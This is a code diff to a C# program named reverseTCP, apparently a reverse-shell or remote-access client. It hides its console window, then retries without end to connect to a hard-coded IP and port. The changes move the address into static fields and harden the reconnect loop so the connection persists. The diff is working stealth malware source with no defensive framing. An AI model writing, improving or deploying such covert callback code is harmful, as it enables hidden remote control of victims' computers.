@@ -12,21 +12,22 @@ namespace reverseTCP
 {
     public class Program
     {
+
+        public static TcpClient clientSocket = new TcpClient();
+        public static string server = "192.168.178.175";
+        public static int serverPort = 6134;
         public static void Main()
         {
             /* Make the Window Invisible */
             invisible.hide();
             
-            /* Create a TcpClient */
-            TcpClient clientSocket = new TcpClient();
-
             /* Try to Connect until it Succeeds */
             while (!clientSocket.Connected)
             {
                 try
                 {
                     /* Connect */
-                    clientSocket.Connect("192.168.178.21", 6134);
+                    clientSocket.Connect(server, serverPort);
                 }
                 catch {
                     /* Skip the Error */
@@ -136,11 +137,20 @@ namespace reverseTCP
                 {
                     try
                     {
-                        
-                        client.Connect("192.168.178.21", 6134);
+                        client.Connect(Program.server, Program.serverPort);
+                        Program.clientSocket = client;
+                        break;
                     }
                     catch {
-                        /*skip*/
+                        client.Close();
+                        client = new TcpClient();
+                        try { 
+                            client.Connect(Program.server, Program.serverPort);
+                            Program.clientSocket = client;
+                        }
+                        catch {
+                            /* skip */
+                        }
                     }
                     Thread.Sleep(3000);
                 }
